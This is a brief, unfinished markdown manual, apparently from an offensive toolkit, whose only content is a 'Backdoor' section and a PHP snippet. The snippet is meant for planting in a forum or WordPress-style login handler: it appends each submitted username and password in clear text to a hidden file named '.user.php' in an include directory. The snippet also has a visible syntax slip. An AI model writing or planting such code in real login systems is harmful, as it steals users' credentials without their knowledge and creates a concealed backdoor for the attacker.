# Manual

TODO: Fill in the info

## Backdoor

- Backdoor user login forum to harvest the credentials in clear text.

```php
if(!empty($_POST['pwd']) {
	$credentials['user_password'] = $_POST['pwd'];
	// file_put_contents("wp-include/.user.php", "WP: " . $_POST['log']
	file_put_contents("/path/to/wp-include/.user.php", "<change_this>: " . $_POST['<change_this>']
			. " : " . $_POST['pwd'] . "\n", FILE_APPEND);
}
```